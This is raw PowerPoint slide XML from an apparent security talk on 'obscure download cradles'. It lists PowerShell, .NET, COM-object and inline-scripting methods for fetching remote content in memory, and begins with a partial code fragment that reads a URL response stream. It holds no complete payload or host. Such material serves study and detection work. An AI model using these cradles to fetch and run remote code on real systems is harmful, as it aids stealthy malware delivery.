              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>) .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>GetResponse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>GetResponseStream</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ReadToEnd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>()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39443841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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>/MsXml2.ServerXmlHttp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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50566" y="1163781"/>
            <a:ext cx="4726322" cy="2762699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8" name="Up Arrow 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5868797" y="3471371"/>
            <a:ext cx="248795" cy="2256087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6998152" y="4288526"/>
            <a:ext cx="2893994" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> class + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Notepad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25424096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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>/MsXml2.ServerXmlHttp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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50566" y="1161935"/>
            <a:ext cx="4726322" cy="2764546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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="38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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Up Arrow 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5868797" y="3471371"/>
            <a:ext cx="248795" cy="2256087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6998152" y="4288526"/>
            <a:ext cx="2893994" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> class + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Notepad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31833037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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>/MsXml2.ServerXmlHttp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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50566" y="1161935"/>
            <a:ext cx="4726322" cy="2764546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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="38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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Up Arrow 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5868797" y="3471371"/>
            <a:ext cx="248795" cy="2256087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6998152" y="4288526"/>
            <a:ext cx="2893994" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> class + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Notepad</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1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6778" y="2583028"/>
            <a:ext cx="5628017" cy="954154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9983101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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>/MsXml2.ServerXmlHttp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
